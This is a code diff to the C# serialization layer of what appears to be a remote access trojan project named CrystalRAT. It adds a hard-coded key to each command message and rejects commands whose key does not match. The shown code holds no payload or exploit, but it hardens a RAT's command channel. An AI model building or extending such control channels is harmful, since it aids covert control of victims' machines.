@@ -13,6 +13,8 @@ namespace CrystalRATShared.Serialization
         public delegate void SerializeArguments(BinaryWriter writer);
         public delegate void CommandHandler(CommandFlags flag, BinaryReader reader);
 
+        private static readonly string integrityKey = @"{3173FE71-0E6E- 4E30- B72B-E38FB0DF650E }";
+
         public static byte[] Serialize(CommandFlags flag, SerializeArguments args = null)
         {
             byte[] data;
@@ -22,6 +24,7 @@ namespace CrystalRATShared.Serialization
                 using (BinaryWriter writer = new BinaryWriter(ms))
                 {
                     writer.Write((int)flag);
+                    writer.Write(integrityKey);
                     args?.Invoke(writer);
                 }
 
@@ -40,9 +43,22 @@ namespace CrystalRATShared.Serialization
             {
                 using (BinaryReader reader = new BinaryReader(ms))
                 {
-
-                    flag = (CommandFlags)reader.ReadInt32();
-                    handler?.Invoke(flag, reader);
+                    try
+                    {
+                        flag = (CommandFlags)reader.ReadInt32();
+                        if (integrityKey == reader.ReadString())
+                        {
+                            handler?.Invoke(flag, reader);
+                        }
+                        else
+                        {
+                            throw new ArgumentException("Integrity key does not match.");
+                        }
+                    }
+                    catch
+                    {
+                        flag = CommandFlags.DataCorrupted;
+                    }
                 }
             }
 
